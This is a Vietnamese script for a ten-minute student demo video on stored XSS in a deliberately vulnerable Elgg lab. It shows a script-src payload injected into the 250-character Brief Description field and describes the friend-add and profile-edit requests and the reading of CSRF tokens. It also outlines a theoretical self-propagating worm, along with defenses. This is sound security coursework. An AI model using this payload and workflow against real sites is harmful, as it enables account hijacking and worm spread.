# Kịch bản video demo (~10 phút) — Self-Propagation Stored XSS trên Elgg

**Ngôn ngữ:** Tiếng Việt · **Thời lượng mục tiêu:** ~10 phút · **Người thuyết minh:** 3 thành viên.

> Lưu ý trung thực: chỉ quay những gì thực sự chạy được. Phần worm tự lan truyền
> **chỉ trình bày phân tích lý thuyết + sơ đồ**, không demo tấn công tự động.
> Che/làm mờ mọi giá trị cookie `Elgg=` và `__elgg_token` khi quay DevTools.

Phân vai gợi ý (nhóm tự xác nhận):
- **Thắng (nhóm trưởng):** mở đầu, tổng quan đề bài, kết luận + khai báo AI.
- **Thi:** môi trường Elgg, trường Brief Description, demo Stored XSS vô hại.
- **Tiến:** web server JS ngoài, validator độ dài, phân tích HTTP + test tự động.

---

### [0:00–0:45] Mở đầu — Thắng
> "Chào thầy/cô và các bạn. Nhóm em gồm Nguyễn Văn Thắng (23001938, nhóm trưởng),
> Đinh Bá Thi (23001942) và Đinh Quang Tiến (23001943). Đề tài của nhóm là tấn
> công **Stored XSS tự lan truyền** trên mạng xã hội Elgg, nhưng khai thác qua
> trường **Brief Description** giới hạn 250 ký tự. Vì giới hạn này, ta không nhét
> được toàn bộ worm vào trường, mà phải tham chiếu tới một file JavaScript đặt
> trên web server ngoài."
*(Màn hình: slide tiêu đề + danh sách thành viên.)*

### [0:45–1:40] Tổng quan đề bài & ranh giới an toàn — Thắng
> "Đề bài yêu cầu: khai thác Stored XSS trên Brief Description, rút gọn payload,
> dựng web server host file .js, và phân tích hành vi worm (kết bạn tự động, tự
> sửa profile, tự nhân bản). Nhóm em thực hiện theo hướng **an toàn, phục vụ học
> thuật**: hạ tầng thật + minh hoạ **vô hại**, còn phần tự lan truyền tự động thì
> **phân tích lý thuyết** chứ không vũ khí hoá. File `exploit.py` của nhóm là
> công cụ **kiểm tra lab**, không phải worm."
*(Màn hình: slide yêu cầu đề bài + slide phạm vi an toàn.)*

### [1:40–2:50] Môi trường Elgg — Thi
> "Đây là lab Elgg 3.0 chạy bằng Docker: web Elgg tại 10.9.0.5 (publish ra
> localhost:8080) và MySQL 8.0.22. Quan trọng: trong image lab, cơ chế chống XSS
> của Elgg đã bị **tắt có chủ đích** — hàm `htmlspecialchars` trong
> `output/text.php` bị comment, nên dữ liệu được in ra **thô**. Đó là lý do
> Stored XSS hoạt động."
*(Màn hình: `docker compose ps`; đăng nhập Elgg bằng tài khoản samy; mở file
text.php cho thấy dòng htmlspecialchars bị comment.)*

### [2:50–4:10] Trường Brief Description & giới hạn 250 ký tự — Thi
> "Mở trang Edit profile của Samy. Trường Brief Description chỉ cho tối đa 250 ký
> tự. Một worm tự chứa như trong bài giảng dài hàng trăm ký tự nên không vừa. Giải
> pháp là chỉ lưu một tham chiếu ngắn `<script src=...>`. Em dán payload **vô
> hại** trỏ tới demo.js của nhóm."
*(Màn hình: nhập `<script src="http://localhost:8000/demo.js"></script>` vào Brief
Description, lưu lại.)*

### [4:10–5:00] Web server JavaScript ngoài — Tiến
> "File JS được phục vụ bởi server Python nhỏ của nhóm. Em chạy
> `python3 exploit.py serve`. Nó mở cổng 127.0.0.1:8000, có endpoint `/health`,
> trả đúng kiểu MIME `application/javascript`, ghi access log và xử lý 404."
*(Màn hình: terminal chạy serve; `curl -I http://127.0.0.1:8000/demo.js` thấy
Content-Type; `curl /health` thấy JSON.)*

### [5:00–6:10] Demo Stored XSS vô hại — Thi
> "Bây giờ đăng nhập bằng một tài khoản khác — Alice — và xem profile của Samy.
> Ngay khi trang tải, script ngoài được tải về và chạy **trong origin của Elgg**:
> hiện banner xanh và một alert 'đã thực thi'. Nhấn F5 vẫn còn, chứng tỏ đây là
> Stored XSS (lưu trong CSDL), không phải reflected. Lưu ý: demo.js **không** sửa
> tài khoản, không kết bạn, không đọc cookie."
*(Màn hình: Alice xem profile Samy → banner/alert; mở DevTools → Network thấy GET
demo.js; Console thấy dòng log [XSS-LAB demo.js].)*

### [6:10–7:00] Rút gọn payload & validator — Tiến
> "Vì sao cách link lại cần thiết? Em dùng tiện ích validator của nhóm:
> payload link chỉ ~53 ký tự, vừa thoải mái trong 250. Validator còn phân biệt
> **số code point** (giới hạn đếm theo cái này) với **số byte UTF-8** — quan trọng
> với chuỗi tiếng Việt có dấu."
*(Màn hình: `python3 exploit.py validate-payload '<script ...>'` → PASS 53/250;
rồi thử chuỗi 251 ký tự → FAIL.)*

### [7:00–8:00] Phân tích HTTP & workflow — Tiến
> "Khi thao tác thủ công (tự kết bạn, tự sửa profile), nhóm quan sát request bằng
> DevTools. Kết bạn là `GET /action/friends/add?friend=<guid>` kèm `__elgg_ts` và
> `__elgg_token`; sửa profile là `POST /action/profile/edit`. Điểm mấu chốt: mã
> XSS chạy **cùng origin** nên đọc được token `elgg.security.token` ngay trên
> trang. Vì vậy **CSRF token không chống được XSS**."
*(Màn hình: sơ đồ http-profile-sequence; DevTools request đã làm mờ token.)*

### [8:00–8:50] Sơ đồ tự lan truyền (lý thuyết) — Thắng
> "Về mặt lý thuyết, worm chạy dưới danh nghĩa Alice có thể ghi lại chính tham
> chiếu đó vào profile của Alice và kết bạn tự động; khi Boby xem profile Alice
> thì lây tiếp: Samy → Alice → Boby. Nhóm em **không** hiện thực hoá bước tự nhân
> bản này — chỉ trình bày bằng sơ đồ tuần tự và sơ đồ luồng dữ liệu, và nêu rõ
> bước nào đã demo, bước nào chỉ lý thuyết."
*(Màn hình: self-propagation-sequence + dataflow; bảng 'demonstrated vs theory'.)*

### [8:50–9:25] Kết quả test tự động — Tiến
> "Toàn bộ thành phần có test tự động: `python3 -m pytest tests/` — 44/44 test
> đạt, gồm kiểm tra giới hạn 250, Unicode, MIME của JS, 404, allow-list từ chối
> mục tiêu công khai."
*(Màn hình: chạy pytest, thấy '44 passed'.)*

### [9:25–10:00] Biện pháp phòng chống, AI & kết luận — Thắng
> "Biện pháp: **mã hoá đầu ra** (bật lại htmlspecialchars) là chính, kèm **lọc đầu
> vào** và **CSP** — mỗi cái đều chặn được chuỗi tấn công. Về AI: nhóm dùng Claude
> Code chủ yếu ở **Mức 3** (AI sinh mã/test/tài liệu theo prompt của nhóm); nhóm
> tự viết prompt, kiểm thử 44/44, dựng lab, thực hiện minh hoạ và chịu trách nhiệm
> nội dung; worm tự lan truyền **chỉ phân tích lý thuyết**. Cảm ơn thầy/cô và các
> bạn đã lắng nghe."
*(Màn hình: slide countermeasures + slide khai báo AI + slide cảm ơn.)*

---

## Mốc thời gian tóm tắt

| Thời gian | Nội dung | Người |
|---|---|---|
| 0:00 | Mở đầu, thành viên | Thắng |
| 0:45 | Tổng quan đề bài + an toàn | Thắng |
| 1:40 | Môi trường Elgg | Thi |
| 2:50 | Brief Description + 250 ký tự | Thi |
| 4:10 | Web server JS ngoài | Tiến |
| 5:00 | Demo Stored XSS vô hại | Thi |
| 6:10 | Validator độ dài | Tiến |
| 7:00 | Phân tích HTTP + CSRF≠XSS | Tiến |
| 8:00 | Sơ đồ tự lan truyền (lý thuyết) | Thắng |
| 8:50 | Kết quả test | Tiến |
| 9:25 | Phòng chống + AI + kết luận | Thắng |
